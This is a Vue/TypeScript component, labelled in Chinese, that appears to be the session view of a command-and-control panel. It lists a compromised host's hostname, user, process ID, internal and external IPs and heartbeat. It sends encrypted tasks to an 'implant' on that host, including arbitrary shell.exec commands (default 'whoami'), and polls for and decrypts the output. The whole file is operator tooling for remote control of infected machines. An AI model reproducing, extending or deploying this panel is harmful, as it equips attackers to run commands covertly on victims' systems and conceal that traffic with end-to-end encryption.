<script setup lang="ts">
import { computed, onMounted, ref } from 'vue';
import { useRoute } from 'vue-router';
import { ElMessage } from 'element-plus';
import { api, HttpError } from '@/lib/api';
import { loadKey, type StoredKey } from '@/lib/keys';
import { decryptResult, encryptTask, QUICK_TASKS } from '@/lib/task';
import { ago, bytes, short, ts } from '@/lib/fmt';

interface Detail {
  id: string;
  host: string | null;
  username: string | null;
  os: string | null;
  arch: string | null;
  pid: number | null;
  internalIp: string | null;
  externalIp: string | null;
  status: string;
  caps: string[];
  tags: string[];
  implantPub: string | null;
  firstSeen: number;
  lastSeen: number;
  recent_tasks: Array<{ id: string; cat: string; status: string; createdAt: number; size: number | null }>;
}

const route = useRoute();
const id = computed(() => String(route.params['id'] ?? ''));
const detail = ref<Detail | null>(null);
const key = ref<StoredKey | null>(null);
const cmd = ref('whoami');
const busy = ref(false);
const log = ref<Array<{ at: string; title: string; body: string; tone: 'ok' | 'warn' | 'danger' }>>([]);

async function load() {
  detail.value = await api.get<Detail>(`/api/v1/sessions/${id.value}`);
}

onMounted(async () => {
  key.value = await loadKey();
  await load();
});

function push(title: string, body: string, tone: 'ok' | 'warn' | 'danger' = 'ok') {
  log.value.unshift({ at: new Date().toLocaleTimeString(), title, body, tone });
}

async function send(kind: keyof typeof QUICK_TASKS | 'custom') {
  if (!key.value || !detail.value?.implantPub) return;
  busy.value = true;
  try {
    const body =
      kind === 'custom'
        ? { k: 'shell.exec', a: { cmd: cmd.value }, ttl: 60 }
        : { ...QUICK_TASKS[kind], ttl: 60 };

    const enc = await encryptTask(
      { priv: key.value.priv, implantPub: detail.value.implantPub, sid: detail.value.id },
      body as { k: string; a: Record<string, unknown>; ttl?: number },
    );

    const res = await api.post<{ task_id: string; online: boolean }>(`/api/v1/sessions/${id.value}/tasks`, {
      cat: body.k.startsWith('shell') ? 'shell' : body.k.startsWith('file') ? 'file' : 'sys',
      ttl: 60,
      rid: enc.rid,
      n: enc.n,
      ct: enc.ct,
    });
    push('已下发', `task ${short(res.task_id, 10)} · online=${res.online}`);

    // 轮询结果（最多 ~20s）；真实产品里应改成 WS push
    for (let i = 0; i < 14; i++) {
      await new Promise((r) => setTimeout(r, 1500));
      try {
        const row = await api.get<{ inlineCt: string | null; nonce: string | null; rid: string | null; size: number }>(
          `/api/v1/results/${res.task_id}`,
        );
        const plain = await decryptResult(
          { priv: key.value.priv, implantPub: detail.value.implantPub, sid: detail.value.id },
          row,
        );
        push(`结果 · ${body.k}`, typeof plain.out === 'string' ? plain.out : JSON.stringify(plain, null, 2));
        await load();
        return;
      } catch (e) {
        if (e instanceof HttpError && e.status === 404) continue;
        throw e;
      }
    }
    push('超时', '20 秒内没拿到结果：会话可能离线，或植入体未实现该任务类型', 'warn');
  } catch (e) {
    push('失败', e instanceof Error ? e.message : String(e), 'danger');
    ElMessage.error(e instanceof Error ? e.message : '下发失败');
  } finally {
    busy.value = false;
  }
}
</script>

<template>
  <div v-if="detail" class="space-y-3">
    <div class="stc-card flex flex-wrap items-center justify-between gap-3 p-4">
      <div>
        <div class="flex items-center gap-2">
          <h1 class="text-base font-semibold">{{ detail.host || '(未上报主机名)' }}</h1>
          <span class="stc-badge" :data-tone="detail.status === 'online' ? 'ok' : 'warn'">{{ detail.status }}</span>
        </div>
        <div class="stc-mono mt-1" style="color: var(--color-muted-foreground)">
          {{ detail.id }}
        </div>
      </div>
      <div class="grid grid-cols-2 gap-x-6 gap-y-1 text-[12px] sm:grid-cols-3">
        <div><span style="color: var(--color-muted-foreground)">OS</span> {{ detail.os || '—' }} / {{ detail.arch || '—' }}</div>
        <div><span style="color: var(--color-muted-foreground)">用户</span> {{ detail.username || '—' }}</div>
        <div><span style="color: var(--color-muted-foreground)">PID</span> {{ detail.pid ?? '—' }}</div>
        <div><span style="color: var(--color-muted-foreground)">内网</span> {{ detail.internalIp || '—' }}</div>
        <div><span style="color: var(--color-muted-foreground)">出口</span> {{ detail.externalIp || '—' }}</div>
        <div><span style="color: var(--color-muted-foreground)">心跳</span> {{ ago(detail.lastSeen) }}</div>
      </div>
    </div>

    <div v-if="!key" class="stc-card p-4 text-[13px]">
      还没有操作员密钥。
      <RouterLink to="/keys" class="underline">去生成并登记</RouterLink>，否则无法加密任务。
    </div>

    <div class="grid gap-3 lg:grid-cols-2">
      <section class="stc-card p-4">
        <h2 class="mb-2 text-sm font-semibold">下发任务（浏览器加密）</h2>
        <div class="mb-2 flex flex-wrap gap-2">
          <button v-for="(_, k) in QUICK_TASKS" :key="k" class="stc-btn" :disabled="busy || !key" @click="send(k)">
            {{ k }}
          </button>
        </div>
        <div class="flex gap-2">
          <input v-model="cmd" class="stc-input" placeholder="自定义命令（shell.exec）" @keyup.enter="send('custom')" />
          <button class="stc-btn" data-variant="primary" :disabled="busy || !key" @click="send('custom')">执行</button>
        </div>
        <p class="mt-2 text-[11px]" style="color: var(--color-muted-foreground)">
          命令在本地用 ECDH 派生的密钥加密后才离开浏览器；服务端只保存密文。
        </p>
      </section>

      <section class="stc-card p-4">
        <h2 class="mb-2 text-sm font-semibold">能力位</h2>
        <div class="flex flex-wrap gap-1">
          <span v-for="c in detail.caps" :key="c" class="stc-badge">{{ c }}</span>
          <span v-if="!detail.caps.length" class="text-[12px]" style="color: var(--color-muted-foreground)">unreported</span>
        </div>
        <h3 class="mt-4 mb-1 text-[12px] font-medium">最近任务</h3>
        <ul class="space-y-1 text-[12px]">
          <li v-for="t in detail.recent_tasks" :key="t.id" class="flex justify-between">
            <span class="stc-mono">{{ short(t.id, 10) }}</span>
            <span>{{ t.cat }}</span>
            <span>{{ t.status }}</span>
            <span style="color: var(--color-muted-foreground)">{{ ts(t.createdAt) }}</span>
          </li>
          <li v-if="!detail.recent_tasks.length" style="color: var(--color-muted-foreground)">还没有任务</li>
        </ul>
      </section>
    </div>

    <section class="stc-card p-4">
      <div class="mb-2 flex items-center justify-between">
        <h2 class="text-sm font-semibold">输出</h2>
        <button class="stc-btn" @click="log = []">清空</button>
      </div>
      <div class="max-h-96 overflow-auto rounded-md p-2" style="background: var(--color-background)">
        <div v-for="(l, i) in log" :key="i" class="mb-2">
          <div class="flex items-center gap-2 text-[11px]" style="color: var(--color-muted-foreground)">
            <span>{{ l.at }}</span>
            <span :style="`color: var(--color-${l.tone === 'ok' ? 'ok' : l.tone === 'warn' ? 'warn' : 'danger'})`">{{ l.title }}</span>
          </div>
          <pre class="stc-mono whitespace-pre-wrap break-all">{{ l.body }}</pre>
        </div>
        <div v-if="!log.length" class="p-2 text-[12px]" style="color: var(--color-muted-foreground)">暂无输出</div>
      </div>
    </section>

    <div class="text-[11px]" style="color: var(--color-muted-foreground)">
      首次心跳 {{ ts(detail.firstSeen) }} · 结果大小上限 {{ bytes(65536) }} 内联，超出走 R2
    </div>
  </div>
  <div v-else class="stc-card p-6 text-[13px]">加载中…</div>
</template>
